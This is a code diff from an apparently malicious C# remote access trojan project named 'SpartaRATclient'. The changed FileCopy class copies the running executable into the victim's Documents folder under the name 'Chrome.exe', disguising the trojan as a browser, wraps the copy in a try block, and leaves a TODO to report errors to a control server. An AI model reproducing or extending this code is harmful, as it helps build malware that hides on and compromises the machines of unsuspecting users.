@@ -1,4 +1,5 @@
-﻿using System;
+﻿using RATclientSparta.Server.Send;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -11,16 +12,20 @@ namespace SpartaRATclient
     public class FileCopy
     {
         //File copy
-        private string CurrentPath;
-        public FileCopy()
-        {
-            this.CurrentPath = Assembly.GetExecutingAssembly().Location;
-        }
-        public String This()
+        public static String This()
         {
             string NewPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
             if (!File.Exists(NewPath))
-                File.Copy(this.CurrentPath, NewPath);
+            {
+                try
+                {
+                    File.Copy(Assembly.GetExecutingAssembly().Location, NewPath);
+                }
+                catch (Exception r)
+                {
+                    //@TODO: Send errors to server
+                }
+            }
             else
                 return "exist";
             return NewPath;
